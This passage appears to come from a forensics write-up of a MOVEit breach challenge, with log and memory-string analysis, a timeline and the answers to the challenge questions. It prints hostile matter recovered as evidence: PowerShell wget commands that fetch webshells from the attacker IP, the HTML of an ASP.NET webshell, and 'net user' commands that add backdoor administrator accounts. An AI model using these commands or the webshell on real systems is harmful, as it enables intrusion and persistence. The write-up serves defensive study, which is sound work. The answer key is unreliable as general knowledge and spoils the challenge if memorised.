(72,'2023-07-12 03:04:43','msg_post',1234,'Guest:YRJXCORD@AQBURYAP.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','189992f80c8b6e881fc18f48f46ab90da25e6e41','',966871855,'/Messages/Global Messaging','',10,0)
(77,'2023-07-12 03:06:42','msg_post',1234,'Guest:SJUHAYDO@KAAXLQSI.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','ff49964e7ac34421ffb354279137a20d56e5d52f','',966871855,'/Messages/Global Messaging','',10,0)
(82,'2023-07-12 03:07:30','msg_post',1234,'Guest:COKGEDGV@PKROFIQP.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','06b088eb422d27f7405ae0959b7a4d516745acb2','',966871855,'/Messages/Global Messaging','',10,0)
(87,'2023-07-12 03:08:37','msg_post',1234,'Guest:LKNLDAEV@XXGYUOKZ.com',966871855,'0','10.255.254.3',4400,'','0','','','Package must have at least one valid recipient.','Ruby','',0,0,'','/Messages/Global Messaging',0,'','','f7d509bea8c67ed46f339f053fd0e648aad4088d','',966871855,'/Messages/Global Messaging','',10,0);
Only the last 16 rows are on the day in question. Looking more closely at these, many are following a pattern:

Username of “Guest:[random characters].com”
Message about “Package must have at least one valid recipient”
User agent of “Ruby”
This looks like the exploit attempt! All of these have the InstID of 1234. This matches what I saw above in the Metasploit code as well.

Memory
Overview
I have a raw 4GB memory file, I-like-to-27a787c5.vmem. As the scenario says, I don’t have the necessary metadata to read it into a tool like Volatility and do real memory analysis. Still strings is a really nice way to get some clues about what’s going on. I can’t try to look at all the strings (there will be just too many), but I can search for interesting terms, which is why I leave this section for last, once I know a good bit about what is going on with the incident (though in real life I would be bouncing between sources).

I’m going to save the strings to a file so I don’t have to re-grep the entire file each time I want to search:

oxdf@hacky$ strings I-like-to-27a787c5.vmem > I-like-to-27a787c5.vmem.strings
oxdf@hacky$ strings -e l I-like-to-27a787c5.vmem >> I-like-to-27a787c5.vmem.strings 
Web Shells
move.aspx
I’ll search for move.aspx with grep against the strings file. It can be helpful to pipe that into sort -u to get rid of duplicate strings. I’ll find things like the IIS log lines

One interesting thing that jumps out looks like the PowerShell command that downloads the webshell from the attacker IP:

wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
That’s a clear answer to the question of how the webshell was downloaded (matching what was in the console history).

There’s a couple lines that look like HTML:

        <filedep name="/move.aspx" />
<form name="cmd" method="post" action="./move.aspx" id="cmd">
I’ll see if I can get the line around that with grep using -A for lines after and -B for lines before, something like:

oxdf@hacky$ cat I-like-to-27a787c5.vmem.strings | grep '<form name="cmd" method="post" action="./move.aspx" id="cmd">' -A 40 -B 20 | less
{;.wrap}

There’s a few instances of the line, and I can put together the full webshell:

<pre>mover\moveitsvc
</pre>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form name="cmd" method="post" action="./move.aspx" id="cmd">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE2MjA0MDg4ODhkZNVOZ3tV2TCTi+hEkha/q+A+5xP6tvrMtJaEupnndGLi" />
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="678AED88" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAANhi3zf7ocw6tYhjdSr5BwWitssAmaVIY7AayhB9duwcnk2JDuMxrvKtMBUSvskgfEkJOF+BOsGxdOjAd7jGUjGbwkQ2wl4sKonDxvg+iiKWg==" />
<input name="txtArg" type="text" value="whoami" id="txtArg" style="width:250px;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" />
<input type="submit" name="testing" value="excute" id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" />
<span id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px">Command:</span>
</form>
</body>
</HTML>
<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
It matches the expected output of this webshell named awen perfectly.

moveit.asp
While I don’t need anything about this shell for the questions, there’s still interesting stuff here. Running grep for moveit.asp just like above finds interesting stuff. It looks like Windows defender managed to catch and quarantine this webshell:

2023-07-12T11:16:34.869Z SDN:Issuing SDN query for \Device\HarddiskVolume4\inetpub\wwwroot\moveit.asp (\Device\HarddiskVolume4\inetpub\wwwroot\moveit.asp) (sha1=f549ea1b040b1a36ee0e7f932386ca1cd057712c, sha2=0a841b7957377458895059e9780f802a2f75b432b0d87a6700098163eddaa276
)
2023-07-12T11:16:35.087Z DETECTIONEVENT MPSOURCE_REALTIME Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp;
2023-07-12T11:16:35.087Z [Mini-filter] Blocked file(#4): \Device\HarddiskVolume4\inetpub\wwwroot\moveit.asp. Process: \Device\HarddiskVolume4\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, Status: 0x0, State: 16, ScanRequest #66604, FileId: 0x32000000042d12, Reas
on: OnClose, IoStatusBlockForNewFile: 0x2, DesiredAccess:0x0, FileAttributes:0x20, ScanAttributes:0x10, AccessStateFlags:0x1, BackingFileInfo: 0x0, 0x0, 0x0:0\0x0:0
2023-07-12T11:16:35.087Z [MpRtp] Engine VFZ block: \Device\HarddiskVolume4\inetpub\wwwroot\moveit.asp. status=0x8070022, statusex=0x2, threatid=0x8003f5b6, sigseq=0x26677c837702
2023-07-12T11:16:35.103Z DETECTION_ADD#1 Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp PropBag [length: 0, data: (null)]
2023-07-12T11:16:35.103Z DETECTION Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp
2023-07-12T11:16:57.181Z DETECTION_CLEANEVENT MPSOURCE_REALTIME MP_THREAT_ACTION_QUARANTINE 0 Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp;
2023-07-12T11:17:27.212Z DETECTION_ADD#1 Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp PropBag [length: 0, data: (null)]
2023-07-12T11:17:27.212Z DETECTION Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp
2023-07-12T11:17:27.212Z DETECTIONEVENT MPSOURCE_SYSTEM Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp;
2023-07-12T11:17:47.511Z DETECTION_CLEANEVENT MPSOURCE_SYSTEM MP_THREAT_ACTION_QUARANTINE 0x80508023 Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp;
2023-07-12T11:17:47.511Z DETECTION_CLEANEVENT MPSOURCE_SYSTEM MP_THREAT_ACTION_QUARANTINE 0x80508023 Backdoor:ASP/Webshell!MSR file:C:\inetpub\wwwroot\moveit.asp;002ignedFileCheck=false, IsNotExcludedCertificate=true (FriendlySigSeq=0x0)7-12-2023 03:15:21
That explains why the actor gets 404 when trying to visit it. There’s also multiple quarantine events. So while the MFT only showed me the last creation time for moveit.asp, it seems like it was uploaded and quarantined multiple times.

There’s also the wget command, matching what was in the PowerShell logs:

wget http://10.255.254.3:9001/moveit.asp -OutFile moveit.asp
Password Change
The easiest way I know of to change a user’s password (including the current user) from the command line is net user [username] [password]. I’ll grep the strings for “net user”. There’s a bunch of activity, and it’s hard to tell what’s from this event. It seems this is likely how the actor changed moveitsvc’s password:

net user "moveitsvc" 5trongP4ssw0rd
There are other instances that would be worth digging into for a real incident:

net user /addnet localgroup administrators
net user /add RIPPC%d rippc >nulC:\Windows\rippc.pngcmd.exe /c taskkill /f /im svchost.exeYour pc is dead!%s\Desktop\RIPPC%d.txtTHERE IS NO REMOVING THIS MALWARE I HOPE YOU LIKE USING A COMPUTER LIKE THIS!#HSTR:Trojan:MSIL/AsyncRAT.PA46!MTB
net user admi
net user admin$ hack /add
net user Administrator /active:no
net user Administrator /active:nonet user
net user d3g1d5 dwixtkj37 /add
net user d3g1d5 dwixtkj37 /addn
net user dfrg.msc-
net user guest 1234qwerr,administrator,guest,vmwareecho signature=$chicago$wmic useraccount where "name = 'guest'secedit /configure /cfgf
net user "moveitsvc" 5trongP4ssw0rd
net user %s Security1215! /addnet user %s waldo1215! /add/EXPIRES:NEVER /Active:YES&net localgroup users %s /delete&net localgroup Administrators %s /addf
net user sysadm h3l_pdesk /expires:never
net user sysadm h3l_pdesk /expires:nevern
Some of these seem like string from within a program (notice the %s placeholders). Still, I’d want to look at the d3g1d5 and sysadm users ASAP.

Results
Timeline
Putting all that together makes the following timeline:

Date Time (UTC)	Description	Source
2023-07-12 10:08:39	First contact from attacker	IIS logs
2023-07-12 10:11:15	nmap scan starts	IIS logs
2023-07-12 10:11:23	nmap scan complete	IIS logs
2023-07-12 10:20:35	Visits with Linux browser	IIS logs
2023-07-12 10:21:52	Initial exploit attempts start	IIS logs
2023-07-12 10:25:03	Initial exploit attempts stop	IIS logs
2023-07-12 11:09:27	moveitsvc account password changed	Event Log 4724
2023-07-12 11:11:18	moveitsvc account successful RDP into host	Event Log 4624
2023-07-12 11:16:35	Defender identifies instance of moveit.asp	VMem
2023-07-12 11:16:57	Defender quaratines moveit.asp	VMem
2023-07-12 11:17:12	Creation of moveit.asp	MFT
2023-07-12 11:17:27	Defender identifies moveit.asp	VMem
2023-07-12 11:17:47	Defender quarantines moveit.asp	VMem
2023-07-12 11:18:36	Actor tries to interact with moveit.asp, gets 404	IIS logs
2023-07-12 11:19:37	Actor copies moveit.asp	MFT
2023-07-12 11:19:46	Actor tries to interact with moveit.asp, gets 404	IIS logs
2023-07-12 11:20:37	Actor tries to interact with moveit.asp, gets 404	IIS logs
2023-07-12 11:24:30	Creation of move.aspx	MFT
2023-07-12 11:24:43	Actor starts interactions with move.aspx	IIS logs, MFT
Question Answers
Name of the ASPX webshell uploaded by the attacker?

move.aspx (IIS logs User Agent Analysis)

What was the attacker’s IP address?

10.255.254.3 (IIS logs User Agent Analysis)

What user agent was used to perform the initial attack?

Ruby (IIS logs User Agent Analysis)

When was the ASPX webshell uploaded by the attacker?

12/07/2023 11:24:30 (MFT move.aspx)

The attacker uploaded an ASP webshell which didn’t work, what is its filesize in bytes? 1362 (MFT moveit.asp)

N/A

Which tool did the attacker use to initially enumerate the vulnerable server?

nmap (IIS logs User Agent Analysis)

We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC).

12/07/2023 11:09:27 (Event Logs Password Change)

Which protocol did the attacker utilize to remote into the compromised machine?

RDP (Event Logs Login Events - Type 10)

Please confirm the date and time the attacker remotely accessed the compromised machine?

12/07/2023 11:11:18 (Event Logs Login Events - Type 10)

What was the useragent that the attacker used to access the webshell?

Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 (IIS logs #user-agent-analysis)

What is the inst ID of the attacker?

1234 (SQL Dump InstID, Metasploit Code Analysis)

What command was run by the attacker to retrieve the webshell?

wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx (PS History Data, vmem strings move.aspx)

What was the string within the title header of the webshell deployed by the TA?

awen asp.net webshell (vmem strings move.aspx)

What did the TA change the our moveitsvc account password to?

5trongP4ssw0rd (vmem strings Password Change)
'''
